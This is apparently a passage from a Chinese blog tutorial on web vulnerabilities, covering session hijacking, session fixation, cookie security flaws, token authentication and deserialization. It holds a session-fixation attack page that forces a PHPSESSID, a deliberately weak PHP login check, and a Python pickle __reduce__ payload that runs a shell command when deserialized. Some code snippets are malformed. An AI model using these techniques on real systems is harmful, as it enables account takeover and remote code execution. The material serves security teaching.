+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551068465.png" class title="img">
+
+<ol>
+<li>这时候带着账号密码去登录,登录成功后,PHPSESSID才能匹配你的信息。否则不登录,在服务端创建的PHPSESSID文件内容为空。登录成功后,在服务端以你的PHPSESSID创建关于你信息的文件,当你带着这个PHPSESSID继续访问的时候,就会从服务端文件里查找关于你的信息,是否是管理员,还是普通用户,这属于后端代码编写不作讨论。</li>
+</ol>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551068748.png" class title="img">
+
+
+
+
+
+<p>在上面我们提到了php中的session,那么一旦phpsessid泄露,相当于别人也可以使用你的身份,而且一</p>
+<p>般session在浏览器关闭后也不会注销,仅仅是你已经丢失了你的sessionid,但是服务端并未立刻失效。</p>
+<h2 id="session劫持"><a href="#session劫持" class="headerlink" title="session劫持"></a>session劫持</h2><p>sessionid不仅仅存储在cookie中,也可能存储在<em><strong>*post get(很少见)*</strong></em>,或者url重写来完成,还有一部分存储在隐藏域中,一般首选是存储在cookie中,当禁用了cookie传递之后就会重写在url里,在url里传递很容易暴露造成更多的安全问题,在允许cookie传递的时候首选cookie,在php中对于session提供了session.use_only_cookies选项,如果为off会话模块会在基于 cookie 的会话 ID 初始化之前 使用 GET 或 POST 请求中的会话 ID（如果存在的话），所以需要设置成on。</p>
+<p>session劫持实际上就是自己的PHPSESSID被攻击者以某种方式获取,然后在会话的有效期内,利用被攻</p>
+<p>击者的身份登录网站,来达到身份劫持,伪装成合法用户。一般PHPSESSID存储在cookie中,XSS攻击也</p>
+<p>会造成session劫持，成功劫持一般需要几个步骤：</p>
+<p>1.用户访问的平台是使用session:来进行身份认证。</p>
+<p>2.用户已经使用账号密码登录该平台,随即该用户会得到一个sessionid。</p>
+<p>3.通过劫持获取到sessionid,并且在sessionid的有效期内使用(未注销前)。</p>
+<p>那么如何获得sessionid是关键,接下来会谈到,一般可以使用</p>
+<p>1.劫持:XSS劫持,局域网嗅探,会话固定结合,任意文件读取漏洞等等。</p>
+<p>2.爆破:直接通过大流量爆破出sessionid(一般是不太可能)。</p>
+<p>3.得到session生成规则,并且得到签名通过计算获取。</p>
+<h3 id="规则爆破"><a href="#规则爆破" class="headerlink" title="规则爆破"></a>规则爆破</h3><p>通过知道规则来进行爆破,不过这种方法基本上是没可能的局限性太多,且概率极小,php中的sessionid</p>
+<p>举例而言。生成规则是根据hash_func散列来生成的,相关的参数有:</p>
+<ul>
+<li>客户端IP</li>
+<li>当前时间(秒)</li>
+<li>当前时间(微秒)</li>
+<li>PHP自带的随机数生产器</li>
+</ul>
+<p>秒微秒可以爆破,随机数也可能是伪随机,客户端P也可以某种手段获取,但是四种同时精准获取,难度</p>
+<p>极大,但是不排除有成功的可能性。根据生成规则,也有可能爆破出,但是相对来说几乎不太可能。</p>
+<h3 id="利用XSS"><a href="#利用XSS" class="headerlink" title="利用XSS"></a>利用XSS</h3><p>利用xSs反弹到的cookie,来伪造身份登录。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551068778.png" class title="img">
+
+<p>使用被攻击者的PHPSESSID：rv3 kprfodknmqdrnfOcuial8r6</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551069081.png" class title="img">
+
+<p>即可利用管理员的session来登录,前提是必须在会话有效期内使用。</p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>或者利用任意文件读取,XXE等来进行读取文件名来获取sessionid,服务端保存的都是在有效期内的session。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551069361.png" class title="img">
+
+<h3 id="会话固定劫持"><a href="#会话固定劫持" class="headerlink" title="会话固定劫持"></a>会话固定劫持</h3><p>会话固定也属于劫持的一种,或者说他是通过攻击者诱导使用固定的sessionid。会话固定的流程主要为</p>
+<p><em><strong>*1.攻击者通过构造url参数或者表单传递来固定sessionid。*</strong></em></p>
+<p>2.诱使用户使用攻击者构造的参数来登陆。</p>
+<p>3.在用户登录之后,攻击者直接使用自己之前构造的固定sessionid.来登陆。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551069412.png" class title="img">
+
+<p>会话固定漏洞并不常见,并且在早期通常是使用url来传递sessionid,这样更极大方便了攻击者,因为只要</p>
+<p>简单构造一条url,并且对于用户是很正常的url,例如,<a target="_blank" rel="noopener" href="http://www.taobao.com/?sessionid=test123,%E5%9C%A8%E7%94%A8%E6%88%B7%E4%BD%BF">www.taobao.com?sessionid=test123,在用户使</a></p>
+<p>用这条url去登陆的时候就会固定了sessionid,就可能造成会话固定劫持漏洞。重置sessionid可由如下。</p>
+<p>1.通过xss漏洞,可以通过js设置cookie中的sessionid。document.cookie&#x3D;”sessionid&#x3D;test123”</p>
+<p>2.通过url传递,直接构造url–&gt;<a target="_blank" rel="noopener" href="http://www.taobao.com/?sessionid=test123">www.taobao.com?sessionid=test123</a></p>
+<p>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookiel的HTTP响应头部,通过自己的服务器页面绑定sessionid。</p>
+<p>接下来我们通过一个简单的pp认证来做一次会话固定劫持,后端对身份验证代码如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start();?&gt;</span><br><span class="line">    if($_POST[&#x27;zhanghao&#x27;=$username] &amp;$_POST[&#x27;mima&#x27;=$password])</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&quot;name&quot;]=$username;</span><br><span class="line">&#125;</span><br><span class="line">if ($_SESSION[name==&quot;&quot;])</span><br><span class="line">   echo&quot;&lt;script&gt;alert(&#x27;对不起,你没有权限&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时攻击者构造一个表单页面。通过js来设置cookie;造成会话固定攻击。此时使用户登陆。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; content=&quot;text/html; charset=gb2312&quot;/&gt;</span><br><span class="line">        &lt;!-- CSRF PoC-generated by Burp Suite Professional --&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;script&gt;history.pushState(&#x27;，&#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">        &lt;form action=&quot;http://127.0.0.1/login.php&quot; method=&quot;PoST&quot;&gt;</span><br><span class="line">        用户名称:&lt;input type=&quot;text&quot; name=&quot;zhanghao&quot;&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">        用户密码:&lt;input type=&quot;password&quot; name=&quot;mima&quot;&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;denglu&quot; value=&quot;™»·&quot; /&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&#x27;Submit request&quot; /&gt;</span><br><span class="line">            &lt;meta http-equiv=&#x27;Set-Cookie&#x27; content=&#x27;PHPSESSID=22333&#x27;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script type=&#x27;text/javascript&#x27;&gt; document.cookie=&#x27;PHPSESSID=123456789&#x27;&lt;/scrip&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551070026.png" class title="img">
+
+<p>此时抓包可以看到,提交的SESSID是我们构造的,而且服务器端暂时未创建123456789的用户session,</p>
+<p>然后用户点击提交。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551070240.png" class title="img">
+
+<p>可以看到服务器端成功创建了我们构造的session,然后攻击者便可以通过PHPSESSID&#x3D;123456789造成</p>
+<p>合法登陆,由此便造成了一次完整的会话固定劫持,当然如果是url传递将更加方便,直接在url里加入自己</p>
+<p>的sessionid,用户点击正常的url登陆即可。</p>
+<h2 id="Cookie身份认证"><a href="#Cookie身份认证" class="headerlink" title="Cookie身份认证"></a>Cookie身份认证</h2><p>在session身份认证中,一切用户的<em><strong>*session都会存储在服务器*</strong></em>,但是如果一旦用户量达到一个上限,那么对于服务器的荷载也是巨大的,但是在<em><strong>*cookie实现身份认证中*</strong></em>,并不会存储在服务器,而是<em><strong>*存储在用户的客户端（浏览器）*</strong></em>,cookie的出现是一次重大的变革,也是一项非常有争议的技术,原因就是因为他的透明性以及信息量,很容易泄露用户的隐私。</p>
+<p>在<em><strong>*session如果不设置过期时间,在服务器上就会一直存在*</strong></em>,永远不会注销,在cookie中如果不设置过期时间,则在<em><strong>*关闭浏览器时销毁该cookie*</strong></em>,session会给服务器造成很大的负载,但是cookie并不存在这个问题,它将信息保存在了每个用户的客户端。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/2kN47TTWqNqXxm5MPSPfK9.png" class title="img">
+
+<p>doGet方法中，new了一个Cookie对象并将其加入到了HttpResponse对象中:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie cookie = new Cookie(&quot;mcrwayfun&quot;,System.currentTimeMillis()+&quot;&quot;);</span><br><span class="line">        // 设置生命周期为MAX_VALUE</span><br><span class="line">        cookie.setMaxAge(Integer.MAX_VALUE);</span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器输入地址进行访问，结果如图所示：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/YdNSqQf2bf99b4egm4Z7oe.png" class title="img">
+
+<p>可见Response Headers中包含Set-Cookie头部，而Request Headers中包含了Cookie头部。name和value正是上述设置的。</p>
+<table>
+<thead>
+<tr>
+<th><em>*<em>*</em>*属性项****</em>*</th>
+<th><em>*<em>*</em>*属性项介绍****</em>*</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NAME&#x3D;VALUE</td>
+<td>键值对，可以设置要保存的 Key&#x2F;Value，注意这里的 NAME 不能和其他属性项的名字一样</td>
+</tr>
+<tr>
+<td>Expires</td>
+<td>过期时间，在设置的某个时间点后该 Cookie 就会失效。Cookie中的maxAge用来表示该属性，单位为秒。如果setmaxAge属性为正数，则表示该Cookie会在maxAge秒之后自动失效。浏览器会将maxAge为正数的Cookie持久化，即写到对应的Cookie文件中（每个浏览器存储的位置不一致）。无论客户关闭了浏览器还是电脑，只要还在maxAge秒之前，登录网站时该Cookie仍然有效。当maxAge属性为负数，则表示该Cookie只是一个临时Cookie，不会被持久化，仅在本浏览器窗口或者本窗口打开的子窗口中有效，关闭浏览器后该Cookie立即失效。maxAge设置为0表示立即删除该Cookie。我们无法在服务端通过cookie.getMaxAge()来判断该cookie是否过期，maxAge只是一个只读属性，值永远为-1。当cookie过期时，浏览器在与后台交互时会自动筛选过期cookie，过期了的cookie就不会被携带了。</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td>生成该 Cookie 的域名，如 domain&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com" .cookie是不可以跨域名的,隐私安全机制禁止网站非法获取其他网站的cookie.正常情况下,同一个一级域名下的两个二级域名也不能交互使用cookie,比如test1.mcrwayfun.com和test2.mcrwayfun.com,因为二者的域名不完全相同.如果想要mcrwayfun.com正常情况下,同一个一级域名下的两个二级域名也不能交互使用cookie,比如test1.mcrwayfun.com和test2.mcrwayfun.com,因为二者的域名不完全相同.如果想要mcrwayfun.com名下的二级域名都可以使用该cookie,需要设置cookie的domain参数为.mcrwayfun.com,这样使用test1.mcrwayfun.com和test2.mcrwayfun.com就能访问同一个cookie. ">www.baidu.com&quot;。Cookie是不可以跨域名的，隐私安全机制禁止网站非法获取其他网站的Cookie。正常情况下，同一个一级域名下的两个二级域名也不能交互使用Cookie，比如test1.mcrwayfun.com和test2.mcrwayfun.com，因为二者的域名不完全相同。如果想要mcrwayfun.com正常情况下，同一个一级域名下的两个二级域名也不能交互使用Cookie，比如test1.mcrwayfun.com和test2.mcrwayfun.com，因为二者的域名不完全相同。如果想要mcrwayfun.com名下的二级域名都可以使用该Cookie，需要设置Cookie的domain参数为.mcrwayfun.com，这样使用test1.mcrwayfun.com和test2.mcrwayfun.com就能访问同一个cookie。</a></td>
+</tr>
+<tr>
+<td>Path</td>
+<td>path属性决定允许访问Cookie的路径。比如，设置为”&#x2F;“表示允许所有路径都可以使用Cookie。一般来说，Cookie发布出来，整个网页的资源都可以使用，但是如果只需要某一个Servlet可以获取到Cookie，其他的资源不能或不需要获取。cookie.setPath(“&#x2F;Servlet);</td>
+</tr>
+<tr>
+<td>Secure</td>
+<td>如果设置了secure属性为true，那么只会在 HTTPS&#x2F;SSL连接时才会回传该 Cookie。</td>
+</tr>
+</tbody></table>
+<h2 id="Cookie和SESSION的区别"><a href="#Cookie和SESSION的区别" class="headerlink" title="***Cookie和SESSION的区别*****"></a><em>*<em>*</em>*Cookie和SESSION的区别****</em>*</h2><h3 id="1-从存储方式上比较"><a href="#1-从存储方式上比较" class="headerlink" title="***1. 从存储方式上比较*****"></a><em>*<em>*</em>*1. 从存储方式上比较****</em>*</h3><p>Cookie只能**<em>*</em>*存储字符串******，如果要存储非ASCII字符串还要对其编码。</p>
+<p> Session可以存储**<em>*</em>*任何类型的数据******，可以把Session看成是一个<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/tke?from_column=20065&from=20065">容器</a></p>
+<h3 id="2-从隐私安全上比较"><a href="#2-从隐私安全上比较" class="headerlink" title="***2. 从隐私安全上比较*****"></a><em>*<em>*</em>*2. 从隐私安全上比较****</em>*</h3><p>Cookie**<em>*</em>*存储在浏览器中，对客户端是可见的******。信息容易泄露出去。如果使用Cookie，最好将Cookie加密。</p>
+<p> Session<em>*<em>*</em>*存储在服务器上，对客户端是透明的。不存在敏感信息泄露问题。****</em>*</p>
+<h3 id="3-从有效期上比较"><a href="#3-从有效期上比较" class="headerlink" title="***3. 从有效期上比较*****"></a><em>*<em>*</em>*3. 从有效期上比较****</em>*</h3><p>Cookie保存在硬盘中，只需要设置maxAge属性为比较大的正整数，即使关闭浏览器，Cookie还是存在的。</p>
+<p> Session的保存在服务器中，设置maxInactiveInterval属性值来确定Session的有效期。并且<em>*<em>*</em>*Session依赖于名为JSESSIONID的Cookie，该Cookie默认的maxAge属性为-1。如果关闭了浏览器，该Session虽然没有从服务器中消亡，但也就失效了。****</em>*</p>
+<h3 id="4-从对服务器的负担比较"><a href="#4-从对服务器的负担比较" class="headerlink" title="***4. 从对服务器的负担比较*****"></a><em>*<em>*</em>*4. 从对服务器的负担比较****</em>*</h3><p>Session是保存在服务器的，每个用户都会产生一个Session，如果是并发访问的用户非常多，是不能使用Session的，Session会消耗大量的内存。</p>
+<p> Cookie是保存在客户端的。不占用服务器的资源。像baidu、Sina这样的大型网站，一般都是使用Cookie来进行会话跟踪。</p>
+<h3 id="5-从浏览器的支持上比较"><a href="#5-从浏览器的支持上比较" class="headerlink" title="***5. 从浏览器的支持上比较*****"></a><em>*<em>*</em>*5. 从浏览器的支持上比较****</em>*</h3><p>如果浏览器禁用了Cookie，那么Cookie是无用的了！</p>
+<p> 如果浏览器禁用了Cookie，Session可以通过URL地址重写来进行会话跟踪。</p>
+<h3 id="6-从跨域名上比较"><a href="#6-从跨域名上比较" class="headerlink" title="***6. 从跨域名上比较*****"></a><em>*<em>*</em>*6. 从跨域名上比较****</em>*</h3><p><em>*<em>*</em>*Cookie可以设置domain属性来实现跨域名****</em>*</p>
+<p><em>*<em>*</em>*Session只在当前的域名内有效，不可跨域名****</em>*</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>cookie中存取了大量用户的信息,如身份id,浏览次数,手机号,等一些隐私信息,截取了某平台的cookie信息,存储的信息量非常多,Cookie的主要功能是实现用户个人信息的记录,它最根本的用途是帮助Wb站点保存有关访问者的信息,可是一旦泄露除了信息泄露,攻击者无疑也可以通过用户身份登录,无疑也是很大的隐患。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551070273.png" class title="img">
+
+<h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p>跨站脚本攻击（XSS）是最常⻅的web漏洞之⼀，攻击者通常会利⽤XSS来窃取Cookie，但****Cookie可能会成为攻击者payload中的⼀部分****。⽹站开发者在某些情况下会将Cookie作为⽹⻚的⼀部分内容，写⼊html中。例如许多开发者喜欢将⽤户的昵称等看似⽆关紧要的信息存储再Cookie中。此时⼤家可能有些疑问，为什么Cookie不是服务端返回设置的吗，那攻击者如何修改⽤户的Cookie呢？其实并不然，许多开发者在不经意间会将⼀些统计信息写⼊Cookie，例如referer、url参数、邀请链接中的邀请码等等，⼀旦有写⼊cookie的动作，就会让攻击者有机可趁，构造恶意的Cookie使其出现在HTML中型成XSS。</p>
+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>越权漏洞顾名思义，就是绕过普通⽤户的权限，可以访问或修改其它⽤户的数据，甚⾄有可能是管理员⽤户数据的漏洞。在Cookie中如果⽤户的特征过于明显，例如 user_id&#x3D;1 ,那么攻击者就会尝试修Cookie中的id探测是否存在越权漏洞。</p>
+<h2 id="缺少安全属性"><a href="#缺少安全属性" class="headerlink" title="缺少安全属性"></a>缺少安全属性</h2><p>Cookie中最常⻅的安全属性有以下三种</p>
+<ul>
+<li>Secure：具有Secure属性值的Cookie只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 中间人攻击。但即便给Cookie设置了Secure属性，敏感信息也不应该通过 Cookie 传输，因为Cookie 有其与⽣俱来的不安全性，Secure 标记也无法提供确实的安全保障。</li>
+</ul>
+<p>从 Chrome 52 和 Firefox 52 开始，仅使用http协议的站点无法对Cookie赋予 Secure 属性。</p>
+<ul>
+<li>HttpOnly：Cookie⼀旦被添加了HttpOnly属性，JavaScript就无法访问带有此属性的Cookie值。不可读取，也无法通过JavaScript对某些Cookie设置HttpOnly属性。此属性只能由HTTP服务端进⾏设置，常见的形式如下：<code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></li>
+<li>Same-Site：Same-Site这个概念很早就被提出，但是全⾯推⼴应⽤的时间线⼤概在Chrome83</li>
+</ul>
+<p>版本之后。Same-Site有以下三种值可选：</p>
+<p>Lax：Cookie允许与top页面⼀起发送，并将与第三⽅⽹站发起的GET请求⼀起发送。Lax为默认的Same-Site值。</p>
+<p>Strict：Cookie只会在当前域名下发送，第三⽅⽹站不允许使⽤当前Cookie值。</p>
+<p>None：Cookie将在所有上下⽂中发送，即允许跨域发送。</p>
+<p>常⻅的形式如下：<code>Set-Cookie: flavor=choco; SameSite=None</code></p>
+<h2 id="易被猜解的Cookie"><a href="#易被猜解的Cookie" class="headerlink" title="易被猜解的Cookie"></a>易被猜解的Cookie</h2><p>这⾥所说的Cookie，指的是在服务端创建完成并返回到前端的Cookie。如果⼀个较为重要的Cookie值，仅通过简单的算法（例如Base64）⽣成，⽽不是随机或使⽤单向函数（例如md5）⽣成的，那么就存在⼀定被破解的⻛险。</p>
+<h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><p>许多开发者喜欢将对象序列化存储在Cookie中，但并未意识到这样情况下会产⽣极⼤的安全⻛险。⽆论服务端使⽤的开发语⾔Python还是Java，都逃不开反序列化的⻛险。⼤家熟知的Shiro-550漏洞（CVE-2016-4437），就是⾮常典型的反序列化导致远程命令执⾏漏洞例⼦，该漏洞的利⽤代码是经过序列化后的数据存放在Cookie中，特征难以识别，⽹络防护设备防护效果差，即便到了今天，互联⽹上仍然有⼀部分web系统可能遭受此漏洞影响。</p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL注⼊是最为常⻅的web漏洞之⼀，Cookie和url中的参数没有区别，都是作为常规字符串或数字传⼊服务端代码中。</p>
+<h2 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h2><p>参数污染也可以理解为参数覆盖。常⻅的后端框架在处理Cookie数据时，不会判断Cookie中是否包含重名的值。攻击者构造出⼤量的重名Cookie，以此⼲扰后端程序的正常运⾏，可能会导致权限绕过等问题。</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问漏洞也可以理解为服务端配置不当。例如某敏感业务需要⽤户登录或管理员登录后才可以访问，但路由上并没有覆盖到，或在配置⽂件中，允许不使⽤Cookie就允许访问此⻚⾯，就可能产⽣未授权访问漏洞。</p>
+<h2 id="Token认证"><a href="#Token认证" class="headerlink" title="Token认证"></a>Token认证</h2><p>我们大家在客户端频繁向服务端请求数据时,服务端就会频繁的去数据库查询用户名和密码并进行对比,判断用户名和密码正确与否,并作出相应提示,也就是在这样的背景下Token便应运而生。</p>
+<ul>
+<li><em><strong>*简单来说,Token是服务端生成的一串字符串,以作为客户端进行请求的一个令牌,当第一次登录后,服务器生成一个Token便将此Token:返回给客户端,以后客户端只需带上这个Token前来请求数据即可,无需再次带上用户名和密码,其目的是为了减轻服务器的压力,减少频繁的查询数据库,使服务器更加健壮。*</strong></em></li>
+<li>生成Token过程中的数据加密在客户端请求服务器端生成token的过程中,主要涉及的两个数据需要加密的情况。一是首次登陆时需要传用户名和密码,其中密码不能以明文传输,需要RSA进行加密,传到服务器端再通过私钥进行解密。二是服务器首次传输token:给客户端时可以对token进行RSA加密,客户端再通过私钥进行解密,如下图:</li>
+</ul>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image-1740551070461.png" class title="img">
+
+<p>Token Auth的优点</p>
+<p>1.支持跨域访问:Cookie是不允许垮域访问的,这一点对Token:机制是不存在的,前提是传输的用户认证信息通过HTTP头传输。</p>
+<p>2.无状态(也称:服务端可扩展行):Token机制在服务端不需要存储session信息,因为Token自身包含了所有登录用户的信息,只需要在客户端的cookie或本地介质存储状态信息。</p>
+<p>3.更适用CDN:可以通过内容分发网络请求你服务端的所有资料(如:javascript,HTML,图片等),而你的服务端只要提供API即可。</p>
+<p>4.去耦:不需要绑定到一个特定的身份验证方案。Tokn可以在任何地方生成,只要在你的APl被调用的时候,你可以进行Token生成调用即可。</p>
+<p>5.更适用于移动应用:当你的客户端是一个原生平台(iOS,Android,Windows8等)时,Cookie是不被支持的(你需要通过Cookie容器进行处理),这时采用Token认证机制就会简单得多。</p>
+<p>6.CSRF:因为不再依赖于Cookie,所以你就不需要考虑对CSRF(跨站请求伪造)的防范。</p>
+<p>7.性能:一次网络往返时间(通过数据库查询session信息)总比做一次HMACSHA256计算的Token验证和解析要费时得多。</p>
+<p>8.不需要为登录页面做特殊处理:如果你使用Protractor做功能测试的时候,不再需要为登录页面做特殊处理。</p>
+<p>9.基于标准化:你的API可以采用标准化的JSON Web Token(JWT),这个标准已经存在多个后端库(NET, Ruby,Java,Python,PHP)和多家公司的支持(如:Firebase,Google,Microsoft)。</p>
+<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="***简介*****"></a><em>*<em>*</em>*简介****</em>*</h2><p><em>*<em>*</em>*序列化****<strong>：把</strong></em>*<em>*对象转换为字节序列**</em>*<strong>的过程，即把对象转换为可以</strong><em>*</em>*存储或传输**<em>*<strong>的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是</strong></em>*<em>*字节或是XML等格式**</em>***。</p>
+<p><em>*<em>*</em>*反序列化****<strong>：把</strong></em>*<em>*字节序列恢复为对象**</em>*<strong>的过程，即把可以存储或传输的数据转换为对象的过程。例如将</strong><em>*</em>*二进制数据流或文件******加载到内存中还原为对象。</p>
+<h2 id="成因"><a href="#成因" class="headerlink" title="***成因*****"></a><em>*<em>*</em>*成因****</em>*</h2><p>在****身份验证，文件读写，数据传输*<em><strong>等功能处，在</strong></em>*未对反序列化接口做访问控制*<em><strong>，</strong></em>*未对序列化数据做加密和签名，加密密钥使用硬编码*<em><strong>（如Shiro 1.2.4），</strong></em>*使用不安全的反序列化框架库****（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="***原理*****"></a><em>*<em>*</em>*原理****</em>*</h2><p>****魔术方法*<em><strong>：在Python和PHP中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是</strong></em>*构造函数或析构函数*<em><strong>）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序</strong></em>*反序列化该对象时触发魔术方法****从而执行命令或代码。</p>
+<p>****反射****：java在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行。</p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><ul>
+<li>pickle.dumps:序列化对象</li>
+<li>pickle.loads：反序列化</li>
+<li>__reduce__：魔术方法，<em><strong>*反序列化该对象时触发。 <strong>reduce</strong>()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用，第二个元素是可调用对象的参数，pickle.loads会解决import问题，对于未引入的module会自动尝试import。*</strong></em></li>
+</ul>
+<p>假设浏览器传递序列化后的<code>Cookie</code>给服务器保存，服务器经过一些处理后反序列化还原<code>Cookie</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 定义一个执行命令的类</span><br><span class="line">class exec:</span><br><span class="line">    def __init__(self,cmd):</span><br><span class="line">        self.cmd=cmd</span><br><span class="line">    </span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system,(self.cmd,))</span><br><span class="line"></span><br><span class="line"># 实例化对象</span><br><span class="line">res=exec(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line"># 序列化</span><br><span class="line">payload=pickle.dumps(res)</span><br><span class="line">print(&quot;Payload:&quot;,payload)</span><br><span class="line">#输出</span><br><span class="line">Payload: b&#x27;\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span><br><span class="line"></span><br><span class="line">#反序列化</span><br><span class="line">new_cookie=pickle.loads(payload)</span><br><span class="line">#输出</span><br><span class="line">whoami: cannot find name for user ID 1157226</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul>
+<li>serialize:序列化函数</li>
+</ul>
+<blockquote>
